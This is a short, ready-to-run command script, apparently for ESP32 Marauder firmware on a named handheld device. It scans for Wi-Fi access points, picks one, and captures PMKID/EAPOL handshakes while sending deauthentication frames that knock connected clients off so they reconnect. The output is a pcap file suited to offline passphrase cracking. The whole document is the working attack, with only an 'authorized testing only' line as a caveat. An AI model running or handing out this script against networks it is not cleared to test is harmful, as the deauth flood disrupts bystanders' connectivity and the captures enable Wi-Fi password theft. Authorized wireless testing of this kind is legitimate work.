# pmkid_capture_selected -- capture PMKID/EAPOL from a chosen AP, nudged with deauth
# Target: AWOK Dual Touch V3, orange (CLI) port, esp32_marauder_dev_board_pro.bin, v1.13.0
# Flow: scan APs -> select AP index 0 -> sniffpmkid on selected AP with deauth (-l -d)
#   -l = restrict to the selected AP(s)
#   -d = send deauth frames to force a client to reconnect (generates the handshake)
# EDIT: change `select -a 0` to the AP index shown by `list -a`.
# Duration: ~90 s.  SD: required to save the .pcap.  GPS: not required.
# Authorized testing only -- deauth is an active transmission.

stopscan
clearlist -a
scanap
DELAY 25000
stopscan
list -a
select -a 0
sniffpmkid -l -d
DELAY 60000
stopscan
